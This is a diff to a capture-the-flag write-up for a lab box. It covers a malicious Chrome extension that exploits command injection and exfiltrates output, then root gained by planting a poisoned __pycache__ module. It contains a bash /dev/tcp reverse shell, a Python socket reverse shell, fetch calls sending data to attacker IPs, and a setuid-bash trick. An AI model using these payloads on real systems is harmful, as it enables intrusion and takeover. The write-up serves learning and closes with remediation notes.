@@ -4,6 +4,9 @@ tags:
   - Linux
   - Chrome
   - Browser extension
+  - javascript
+  - __pychache__
+  - pycache
 
 icon: simple/gnometerminal
 ---
@@ -178,7 +181,7 @@ First, let's set up our manifest.json:
 Then, the contents of our background.js:
 
 ```
-fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(id)]")
+fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(id)]")
     .then(r => r.text())
     .then(d => fetch("http://10.10.10.10:8000/" + btoa(d)))
 ```
@@ -187,34 +190,94 @@ We upload this via the web app. This should hit the endpoint, encode the respons
 
 ```
 $ python3 -m http.server
+<SNIP>
+09/Jul/2026 07:46:21] "GET /Um91dGluZSBleGVjdXRlZCAh HTTP/1.1" 404 -
 
-
-$ echo '' | base64 -d
-
+$ echo 'Um91dGluZSBleGVjdXRlZCAh' | base64 -d
+Routine executed !
 ```
 
 We don't get to see the output of the command. Let's add the >&2 redirector to see if the command shows up to us:
 
 ```
-fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(id)]")
+fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(id>&2)]")
     .then(r => r.text())
     .then(d => fetch("http://10.10.10.10:8000/" + btoa(d)))
 ```
 
-Let's try to ping our own attack and check if we're getting pinged.
+Nope, still can't see the output. Let's try to ping our own attack and check if we're getting pinged.
 
 ```
-fetch("http://127.0.0.1:5000/routine/" + encodeURIComponent("x[$(ping -c 1 10.10.14.61)]")
+fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(ping -c 1 10.10.14.61)]")
 
 $ sudo tcpdump -i tun0 icmp
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
+07:54:06.430624 IP browsed.htb > 10.10.10.10: ICMP echo request, id 9169, seq 1, length 64
+07:54:06.438406 IP 10.10.10.10 > browsed.htb: ICMP echo reply, id 9169, seq 1, length 64
+07:54:07.453691 IP browsed.htb > 10.10.10.10: ICMP echo request, id 9169, seq 2, length 64
+07:54:07.453740 IP 10.10.10.10 > browsed.htb: ICMP echo reply, id 9169, seq 2, length 64
+07:54:08.377268 IP browsed.htb > 10.10.10.10: ICMP echo request, id 9169, seq 3, length 64
+07:54:08.377320 IP 10.10.10.10 > browsed.htb: ICMP echo reply, id 9169, seq 3, length 64
+07:54:09.502928 IP browsed.htb > 10.10.10.10: ICMP echo request, id 9169, seq 4, length 64
+07:54:09.502989 IP 10.10.10.10 > browsed.htb: ICMP echo reply, id 9169, seq 4, length 64
+```
+Bingpot!
+
+Finally, to get a shell:
 
 ```
+fetch("http://127.0.0.1:5000/routines/" + encodeURIComponent("x[$(bash -i >& /dev/tcp/10.10.10.10./9001 0>&1)]")
+```
 
+This didn't work. But if base64 encode it (and then pipe to b64 -d and pipe to bash) then it works. We set up our listener and get the flag!
 
-
-## Privilege Escalation
 
 ## Root
 
-## Remediation notes
+First thing I did when landing on the box was `sudo -l`, which in this case shows us:
 
+```
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+```
+
+After a long time looking at the tools intended functionality and potential inputs I could give it to break free, it turns out there's a different path. The tool loads modules from extension_utils.py. When a tool does that, python compiles the tool and stores it in __pycache__ so that if we run the tool again it can use that cache instead of compiling again from scratch. For example, if we check __pycache__ after running the tool, we can find the following file: extension_utils.cpython-312.pyc (the convention is \<module_name>.\<interpreter>-\<version>.pyc). So if we can compile our own malicious module and store the binary there, when we run the tool it will pull our code instead.
+
+```
+# extension_tool.py calling utils code
+if args.clean:
+    clean_temp_files(args.clean)
+
+<SNIP>
+
+manifest_data = validate_manifest(manifest_path)
+
+# Let's create both functions to avoid errors
+
+import os
+import pty
+import socket
+import subprocess
+
+def validate_manifest(path):
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(("10.10.14.67",9001))
+    os.dup2(s.fileno(),0)
+    os.dup2(s.fileno(),1)
+    os.dup2(s.fileno(),2)
+    pty.spawn("/bin/bash")
+
+def clean_temp_files(extension_dir):
+    return 0
+```
+
+My first naive attempt was just to compile this with `python3 -m py_compile` and place it in __pycache__. However, when I run the tool it replaces this cache with the legit cache. So somehow it knows that this is not the correct cache, and it's overwritting it with a re-compiled one. Reading more into it, there is actually a header that python uses to verify whether it should use this cache or not. I spent a long time trying to alter the header so that it enters the UNCHECKED_HASH mode, but couldn't get it to work. So instead I will compile my own malicious binary and replace the header with the header of the legit file.
+
+I can edit the header in the .pyc file by using vim and then entering hex mode with :%!xxd and then exit that mode with :%!xxd -r Aaand that didn't work either, I give up. Will use 0xdf's python script that does the same thing automatically. It appends code to create a copy of /bin/bash with setuid by running chmod 6777 on it. It changes the header to the legit one. And we get root!
+
+
+## Remediation notes
+- Don't run random extensions on Chrome  
+- Make sure __pycache__ is not world writeable  
+- Don't give sudo nopass privileges unless necessary
